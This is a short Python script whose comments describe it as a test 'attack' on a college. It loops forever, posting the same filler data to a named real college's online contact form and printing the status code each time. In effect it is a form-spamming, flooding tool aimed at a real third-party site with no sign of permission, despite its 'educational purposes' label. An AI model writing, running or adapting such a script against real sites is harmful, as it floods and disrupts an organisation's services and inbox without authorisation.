import requests
#  Mswc attack
# It was a random test attack i made on a college ... Just for edu. purposes..

params = { 'name':'zsdn', 'email':'zaid@gmail.com','phone':'9878373223', 'message':'tesitng only', 'firstname':'zsdn'}

while True:
    requests.session()
    r = requests.post("https://mscw.ac.in/contactus.aspx", data=params)
    print(r.status_code)


